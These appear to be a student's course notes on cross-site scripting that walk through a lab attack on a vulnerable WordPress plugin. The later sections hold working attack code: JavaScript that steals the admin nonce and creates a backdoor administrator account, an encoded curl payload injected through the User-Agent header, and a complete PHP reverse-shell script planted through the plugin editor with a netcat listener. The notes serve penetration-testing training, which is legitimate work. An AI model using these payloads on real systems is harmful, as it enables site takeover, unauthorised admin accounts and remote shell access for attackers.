+ Once the blank page is loaded, we'll click on the _Web Console_ from the Web Developer sub-menu in the Firefox Menu or use the shortcut Ctlr+Shift+K
![[Pasted image 20230811152706.png]]
+ From within the Console, we can execute our test function and retrieve the output
+ Printing values to the browser's console is another technique we can add to our debugging toolkit that will be extremely useful when analyzing more complex JavaScript code

### Identifying XSS Vulnerabilities 
We can find potential entry points for XSS by examining a web application and identifying *input fields* (such as search fields) that *accept un-sanitized input*, which is then *displayed as output* in subsequent pages
+ Once we identify an entry point, we can input special characters and observe the output to determine if any of the special characters return unfiltered
+ The most common special characters used for this purpose include:
```
< > ' " { } ;
```
+ HTML uses `<` and `>` to denote _elements_, the various components that make up an HTML document
+ JavaScript uses `{` and `}` in function declarations
+ Single `'` and double `"` quotes are used to denote strings
+ Semicolons `;` are used to mark the end of a statement

If the application does not remove or encode these characters, it may be vulnerable to XSS because the app _interprets_ the characters as code, which in turn, enables additional code

While there are multiple types of encoding, the most common we'll encounter in web applications are _HTML encoding_ and _URL encoding_
+ URL encoding, sometimes referred to as _percent encoding_, is used to convert non-ASCII and reserved characters in URLs, such as converting a space to `%20`
+ HTML encoding (or _character references_) can be used to display characters that normally have special meanings, like tag elements. For example, `<` is the character reference for `<`. When encountering this type of encoding, the browser will not interpret the character as the start of an element, but will display the actual character as-is

If we can inject these special characters into the page, the browser will treat them as code elements
+ We can then begin to build code that will be executed in the victim's browser once it loads the maliciously-injected JavaScript code

We may need to use different sets of characters, depending on where our input is being included
+ For example, if our input is being added between _div_ tags, we'll need to include our own _script tags_ and need to be able to inject `<` and `>` as part of the payload
+ If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code

### Basic XSS
Will demonstrate a XSS with a attack on an OffSec WordPress instance 
+ The WordPress installation is running a plugin named _Visitors_ that is vulnerable to stored XSS
+ The plugin's main feature is to log the website's visitor data, including the IP, source, and User-Agent fields
+ If we inspect the **database.php** file, we can verify how the data is stored inside the WordPress database:
``` PHP
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```
+ This PHP function is responsible for parsing various HTTP request headers, including the User-Agent, which is saved in the _useragent_ record value

Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the following portion of code from **start.php**:
``` PHP
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```
+ From the above code, we'll notice that the _useragent_ record value is retrieved from the database and inserted plainly in the Table Data (_td_) HTML tag, without any sort of data sanitization
+ As the User-Agent header is under user control, we could craft an XSS attack by inserting a script tag invoking the _alert()_ method to generate a pop-up message
+ Given the immediate visual impact, this method is very commonly used to *verify* that an application is vulnerable to XSS
+ Although we just performed a white-box testing approach, we could have discovered the same vulnerability by testing the plugin through black-box HTTP header fuzzing

With Burp configured as a proxy and Intercept disabled, we can start our attack by first browsing to `http://offsecwp/` using Firefox
+ We'll then go to Burp _Proxy_ > _HTTP History_, right-click on the request, and select _Send to Repeater_
![[Pasted image 20230812125307.png]]
+ Moving to the _Repeater_ tab, we can replace the default User-Agent value with the a script tag that includes the alert method (`<script>alert(42)</script>`), then send the request:
![[Pasted image 20230812125349.png]]
+ If the server responds with a _200 OK_ message, we should be confident that our payload is now stored in the WordPress database

To verify this, let's log in to the admin console at `http://offsecwp/wp-login.php` using the _admin/password_ credentials
+ If we navigate to the Visitors plugin console at `http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php`, we are greeted with a pop-up banner showing the number 42, proving that our code injection worked:
![[Pasted image 20230812125508.png]]

Excellent. We have injected an XSS payload into the web application's database and it will be served to any administrator that loads the plugin. A simple alert window is a somewhat trivial example of what can be done with XSS, so let’s try something more interesting, like creating a new administrative account 
### Privilege Escalation via XSS
If JavaScript code can be stored inside a WordPress application and is executed by the admin user, it allows for more avenues of obtaining administrative privileges 
+ Could leverage our XSS to steal cookies, and session information if the application uses an insure session management configuration 
+ If we can steal an authenticated user cookie, can masquerade as that user within the target web site 

Websites use cookies to track *state* and information about users 
+ Cookies can be set with several optional flags, including two that are particularly interesting to penetration testers: *Secure* and *HttpOnly*  
	+ The *Secure* flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS
		+ This protects the cookie from being sent in clear text and captured over the network 
	+ The *HttpOnly* flag instructs the browser to deny JavaScript access to the cookie
		+ If this flag is not set, we can use an XSS payload to steal the cookie 

Can verify the nature of WordPress' session cookies by first logging in as the _admin_ user
+ Next, we can open the Web Developer Tools, navigate to the _Storage_ tab, then click on `http://offsecwp` under the _Cookies_ menu on the left:
![[Pasted image 20230812130725.png]]

We notice that our browser has stored six different cookies, but only four are session cookies 
+ Of these four cookies, can exclude the negligible *wordpress_test_cookie*, all support the HttpOnly feature 
+ Since all the session cookies can be sent only via HTTP, they also cannot be retrieved by JavaScript, and will have to find a new angle of attack 

When the admin loads the Visitors plugin dashboard that contains the injected JavaScript, it executes whatever the provided payload is 
+ Can craft a JavaScript function that adds another WordPress Admin account, so that once the real administrator executes our injected code, the function will execute behind the scenes 

In order to succeed with this attack angle, will need to cover another web application attack class 
+ Will create a JS function that fetches the WordPress admin *nonce* 
+ The *nonce* is server a server-generated token that includes in each HTTP request to add randomness and prevent *Cross-Site-Request-Forgery* (**CSRF**) attacks 

The malicious link could be disguised by an apparently-harmless description, luring the victim to click on it:
``` HTML
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000">Check out these awesome cat memes!</a>
```
+ The URL link is pointing to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker account 
+ If this link was embedded into the HTML code of an email, the user would be only able to see the link description, but not the actual HTTP resource its pointing to 
+ The attack would be successful if the user is already logged in with a valid session on the same website 

In our case, by including and checking the pseudo-random *nonce*, WordPress prevents this kind of attack, since the attacker could not have prior knowledge of the token 
+ However, the nonce won't be an obstacle for the stored XSS vulnerability discovered in the plugin, which will be explained 
+ As mentioned, in order to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:
``` JavaScript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
+ This function performs a new HTTP request towards the **/wp-admin/user-new.php** URL and saves the nonce value found in the HTTP response based on the regular expression
+ The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user:
``` JavaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
+ Highlighted in this function is the new backdoored admin account, just after the nonce we obtained previously.
+ If our attack succeeds, we'll be able to gain administrative access to the entire WordPress installation

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it 
+ To minify our attack code into a one-liner, we can navigate to JS Compress: https://jscompress.com/
![[Pasted image 20230813112356.png]]
+ Once we have clicked on _Compress JavaScript_, we'll copy the output and save it locally

As a final attack step, we are going to **encode** the minified JavaScript code, so any bad characters won't interfere with sending the payload. We can do this using the following function:
``` JavaScript
function encode_to_javascript(string) {
    var input = string
    var output = '';
	for(pos = 0; pos < input.length; pos++) {
		output += input.charCodeAt(pos);
		if(pos != (input.length - 1)) {
			output += ",";
		}
	}
    return output;
}

let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
+ The _encode_to_javascript_ function will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the _charCodeAt_ method

Will run the function from the browser's console:
![[Pasted image 20230813112531.png]]
+ We are going to decode and execute the encoded string by first decoding the string with the _fromCharCode_ method, then running it via the _eval()_ method 
+ Once we have copied the encoded string, we can insert it with the following **curl** command and launch the attack:
```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

Before running the curl attack command, let's start Burp and leave Intercept on
+ We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further
+ After running the curl command, we can inspect the request in Burp:
![[Pasted image 20230813113507.png]]
+ Everything seems correct, so let's forward the request by clicking _Forward_, then disabling Intercept

At this point, our XSS exploit should have been stored in the WordPress database
+ We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left:
![[Pasted image 20230813113541.png]]
+ We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into "`<script>`" tags, so the browser cannot render any string from it

By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the _Users_ menu on the left pane:
![[Pasted image 20230813114806.png]]
+ Due to this XSS flaw, we managed to elevate our application privileges from a standard user to administrator via a specially-crafted HTTP request
+ We could now advance our attack and gain access to the underlying host by crafting a custom *WordPress plugin with an embedded web shell*

#### WebShell via Wordpress Plugin Edit
`Hello Dolly` is a common default plugin, it is available on:
![[Screenshot 2023-08-13 at 4.29.28 PM.png]]
+ Can edit that plugin with the plugin editor
![[Screenshot 2023-08-13 at 4.30.13 PM.png]]

Will put the malicious php script (php backdoor) stored in: `/usr/share/webshells/php/php-reverse-shell.php`, inside the plugin editor (Should change the ip to the attacker ip and port to something we know):
``` PHP
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
```

Will then start a listener with <mark style="background: #D2B3FFA6;">netcat</mark>: `nc -nvlp 1234`
+ Note that the port should be the same as what was set

Will now click the *Activate* button for the *Hello Dolly* plugin 
![[Screenshot 2023-08-13 at 4.39.10 PM.png]]
+ Will likely get an error similar to the one shown in the above, but the listener will now be an interactive shell